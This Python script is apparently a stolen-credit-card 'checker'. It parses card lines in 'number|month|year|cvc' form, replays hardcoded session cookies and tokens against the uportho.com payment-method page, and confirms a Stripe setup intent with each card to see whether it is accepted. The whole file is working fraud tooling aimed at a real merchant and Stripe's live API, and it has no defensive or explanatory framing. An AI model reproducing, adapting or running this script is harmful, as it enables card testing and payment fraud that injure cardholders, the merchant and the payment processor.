import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	cookies = {
	    'frontend_lang': 'en_US',
	    '_fbp': 'fb.1.1774627279794.126102955521407653',
	    'seen_product_id_48293': '48293',
	    'session_id': 'QllPcnWh4gmK7SMvwKRCw5LvL4yiyhmNsvBOpgk1HlRpucAaku5R8RkPOZ2E0N99y4LNnfoJvRRudDrz1FoA',
	    'tz': 'Asia/Bangkok',
	}
	
	headers = {
	    'authority': 'www.uportho.com',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/json',
	    # 'cookie': 'frontend_lang=en_US; _fbp=fb.1.1774627279794.126102955521407653; seen_product_id_48293=48293; session_id=QllPcnWh4gmK7SMvwKRCw5LvL4yiyhmNsvBOpgk1HlRpucAaku5R8RkPOZ2E0N99y4LNnfoJvRRudDrz1FoA; tz=Asia/Bangkok',
	    'origin': 'https://www.uportho.com',
	    'referer': 'https://www.uportho.com/my/payment_method',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'id': 1,
	    'jsonrpc': '2.0',
	    'method': 'call',
	    'params': {
	        'provider_id': 8,
	        'payment_method_id': 77,
	        'token_id': None,
	        'amount': None,
	        'flow': 'direct',
	        'tokenization_requested': True,
	        'landing_route': '/my/payment_method',
	        'is_validation': True,
	        'access_token': '916f567c8a985088e28412884ad8ae2e65264f9b085f0e36e986909e78c24c11',
	        'csrf_token': '819aa8375ab7d268625fc104c17dbc6fa4194d4eo1806164850',
	        'currency_id': None,
	        'partner_id': 29079,
	        'reference_prefix': 'V-20260327162730',
	    },
	}
	
	response = requests.post('https://www.uportho.com/payment/transaction', cookies=cookies, headers=headers, json=json_data)
	
	seti = re.search(r'"client_secret": "(.*?)_secret', response.text).group(1)
	scrt = re.search(r'"client_secret": "(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'return_url=https%3A%2F%2Fwww.uportho.com%2Fpayment%2Fstripe%2Freturn%3Freference%3DV-20260327162730&payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[billing_details][address][country]=TH&payment_method_data[payment_user_agent]=stripe.js%2Fa000efd06a%3B+stripe-js-v3%2Fa000efd06a%3B+payment-element%3B+deferred-intent&payment_method_data[referrer]=https%3A%2F%2Fwww.uportho.com&payment_method_data[time_on_page]=28167&payment_method_data[client_attribution_metadata][client_session_id]=14ffa800-aae5-4058-a0e0-b69dc9d000e9&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&payment_method_data[client_attribution_metadata][elements_session_id]=elements_session_1nvi50wd02N&payment_method_data[client_attribution_metadata][elements_session_config_id]=6c6a9383-4a43-4c08-9295-9ee9b0b90f70&payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]=payment&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&client_context[currency]=ron&client_context[mode]=setup&client_context[capture_method]=automatic&client_context[payment_method_types][0]=card&client_context[setup_future_usage]=off_session&use_stripe_sdk=true&key=pk_live_bCePCGuVZkEyVHkk8jeLoT8400l0kjsuBU&_stripe_version=2019-05-16&client_attribution_metadata[client_session_id]=14ffa800-aae5-4058-a0e0-b69dc9d000e9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1nvi50wd02N&client_attribution_metadata[elements_session_config_id]=6c6a9383-4a43-4c08-9295-9ee9b0b90f70&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_secret={scrt}'
	
	response = requests.post(
	    f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
	    headers=headers,
	    data=data,
	)
	
	return response.text
